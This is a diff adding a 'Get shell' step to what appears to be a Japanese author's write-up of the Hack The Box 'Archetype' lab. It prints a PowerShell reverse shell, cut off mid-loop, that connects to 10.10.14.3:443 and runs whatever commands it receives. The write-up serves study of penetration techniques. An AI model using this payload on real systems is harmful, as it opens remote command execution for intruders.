@@ -306,3 +306,19 @@ archetype\sql_svc
 NULL         
 ```
 
+### 4. Get shell (Nomal user)
+Then, try to get shell using the code below the same as [writeup](file:///C:/Users/ttakaki/Downloads/Archetype.pdf "writeup").
+
+```
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
+    $data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+```
+
+The [ref1](https://qiita.com/LazarusMakoto/items/631af8aba4079f82c7c3 "ref1"), [ref2](https://www.vwnet.jp/Windows/PowerShell/Ope/OpeListg.htm "ref2"), [ref3](https://qiita.com/minr/items/b4f71dad4438707d84d3 "ref3"), [ref4](https://win.just4fun.biz/?PowerShell/%E6%96%87%E5%AD%97%E5%88%97%E3%82%92%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%A8%E3%81%97%E3%81%A6%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%83%BBInvoke-Expression "ref4") may help you to understand what the code means.
+To put it simply, this code sends a command, displays the returned string, and accepts the command again.
+
